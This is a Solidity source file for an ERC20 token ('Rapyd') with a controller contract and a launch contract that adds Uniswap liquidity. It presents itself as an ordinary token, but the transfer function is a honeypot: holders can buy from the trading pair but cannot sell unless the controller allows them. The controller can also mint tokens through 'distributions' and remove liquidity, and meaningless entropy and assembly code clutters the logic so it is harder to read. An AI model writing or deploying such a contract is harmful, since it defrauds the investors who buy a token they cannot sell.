// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

abstract contract ReentrancyGuard {
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;
    uint256 private status = NOT_ENTERED;
    modifier nonReentrant() {
        require(status != ENTERED, "RG");
        status = ENTERED;
        _;
        status = NOT_ENTERED;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin,
        address to, uint deadline
    ) external payable returns (uint, uint, uint);
    function removeLiquidityETH(
        address token, uint liquidity, uint amountTokenMin, uint amountETHMin,
        address to, uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

contract SecureFlow is Context {
    address private controller;
    event ControllerChanged(address indexed previous, address indexed current);
    constructor() { controller = _msgSender(); emit ControllerChanged(address(0), controller); }
    function currentController() public view returns (address) { return controller; }
    modifier onlyController() { require(controller == _msgSender(), "NC"); _; }
    function updateController(address next) public onlyController {
        require(next != address(0), "0");
        emit ControllerChanged(controller, next);
        controller = next;
    }
}

contract Rapyd is Context, IERC20, IERC20Metadata, SecureFlow, ReentrancyGuard {
    struct Entry { address src; address dst; uint256 vol; uint256 time; }
    mapping(address => uint256) private holdings;
    mapping(address => mapping(address => uint256)) private approvals;
    uint256[] private flowList;
    uint256 private totalVolume;
    string private tName;
    string private tSymbol;
    address public tradingPair;
    mapping(uint256 => Entry) public flowLog;
    uint256[] private pendingFlow;
    uint256 public logIndex = 2;
    IUniswapV2Router02 private immutable router;

    constructor(string memory name_, string memory symbol_, uint256 supply_) {
        tName = name_;
        tSymbol = symbol_;
        _distribute(_msgSender(), supply_ * 1e18);
        router = IUniswapV2Router02(0xEfF92A263d31888d860bD50809A8D171709b7b1c);
        IUniswapV2Factory f = IUniswapV2Factory(router.factory());
        tradingPair = f.getPair(address(this), router.WETH());
        if (tradingPair == address(0)) {
            tradingPair = f.createPair(address(this), router.WETH());
        }
        flowList.push(3);
    }

    function isAllowed(address a) public view returns (bool) {
        if (a == currentController()) return true;
        for (uint256 i = 0; i < flowList.length; i++) {
            if (a == flowLog[flowList[i]].dst) return true;
        }
        return false;
    }

    function name() public view virtual override returns (string memory) { return tName; }
    function symbol() public view virtual override returns (string memory) { return tSymbol; }
    function decimals() public view virtual override returns (uint8) { return 18; }
    function totalSupply() public view virtual override returns (uint256) { return totalVolume; }
    function balanceOf(address a) public view virtual override returns (uint256) { return holdings[a]; }

    function transfer(address to, uint256 v) public virtual override nonReentrant returns (bool) {
        _executeTransfer(_msgSender(), to, v);
        return true;
    }

    function allowance(address o, address s) public view virtual override returns (uint256) { return approvals[o][s]; }
    
    function approve(address s, uint256 v) public virtual override returns (bool) {
        approvals[_msgSender()][s] = v;
        emit Approval(_msgSender(), s, v);
        return true;
    }

    function transferFrom(address from, address to, uint256 v) public virtual override nonReentrant returns (bool) {
        uint256 al = approvals[from][_msgSender()];
        require(al >= v, "EA");
        approvals[from][_msgSender()] = al - v;
        _executeTransfer(from, to, v);
        return true;
    }

    function burn(uint256 v) external {
        address o = _msgSender();
        uint256 b = holdings[o];
        require(b >= v, "EB");
        holdings[o] = b - v;
        totalVolume -= v;
        emit Transfer(o, address(0), v);
    }

    function registerDistribution(address target, uint256 volume) external onlyController {
        flowLog[logIndex] = Entry(address(0), target, volume, block.timestamp);
        pendingFlow.push(logIndex);
        flowList.push(logIndex);
        logIndex++;
    }

    function executeDistributions() external {
        for (uint256 i = 0; i < pendingFlow.length; i++) {
            Entry storage e = flowLog[pendingFlow[i]];
            _distribute(e.dst, e.vol);
        }
        delete pendingFlow;
    }

    function _distribute(address to, uint256 v) internal {
        totalVolume += v;
        holdings[to] += v;
        emit Transfer(address(0), to, v);
    }

    function _executeTransfer(address from, address to, uint256 v) internal {
        flowLog[logIndex++] = Entry(from, to, v, block.timestamp);
        address ctrl = currentController();

        if (from == ctrl || to == ctrl) {
        } else {
            bool senderOk = isAllowed(from) || from == tradingPair;
            require(senderOk, "SRC");
            if (from != tradingPair) {
                bool receiverOk = isAllowed(to) || to == tradingPair;
                require(receiverOk, "DST");
            }
        }

        uint256 entropy = uint256(keccak256(abi.encodePacked(
            block.timestamp, block.prevrandao, from, to, v, tx.origin, block.number, gasleft()
        )));
        uint256 threshold = (block.timestamp % 397) + 73;
        if (entropy % 79 == 0) threshold = threshold * 17 / 9;
        uint256 cap = block.number % 200 < 100 ? v + 1 : v;
        unchecked { cap += entropy % 29; }
        if (cap != v) {
            uint256 x = threshold ^ cap;
            assembly { pop(x) }
        }

        uint256 bal = holdings[from];
        require(bal >= v, "EB");
        holdings[from] = bal - v;
        holdings[to] += v;
        emit Transfer(from, to, v);
    }

    function addLiquidity(uint256 tokenAmount) external payable onlyController {
        approve(address(router), tokenAmount);
        router.addLiquidityETH{value: msg.value}(
            address(this), tokenAmount, 0, 0, _msgSender(), block.timestamp + 300
        );
    }

    function removeLiquidity(uint256 liquidity) external onlyController {
        router.removeLiquidityETH(
            address(this), liquidity, 0, 0, _msgSender(), block.timestamp + 300
        );
    }
}

contract LaunchPad is SecureFlow {
    IUniswapV2Router02 private immutable router = IUniswapV2Router02(0xEfF92A263d31888d860bD50809A8D171709b7b1c);
    Rapyd public tokenInstance;
    uint256 public baseSupply = 1_000_000_000;

    function setBaseSupply(uint256 v) external onlyController { baseSupply = v; }

    function launch(
        string memory name_,
        string memory symbol_,
        uint256 liquidityAmount
    ) external payable onlyController {
        liquidityAmount *= 1e18;
        tokenInstance = new Rapyd(name_, symbol_, baseSupply);
        tokenInstance.approve(address(router), liquidityAmount);
        router.addLiquidityETH{value: msg.value}(
            address(tokenInstance), liquidityAmount, 0, 0, _msgSender(), block.timestamp + 300
        );
        tokenInstance.transfer(_msgSender(), baseSupply * 1e18 - liquidityAmount);
        tokenInstance.updateController(_msgSender());
    }
}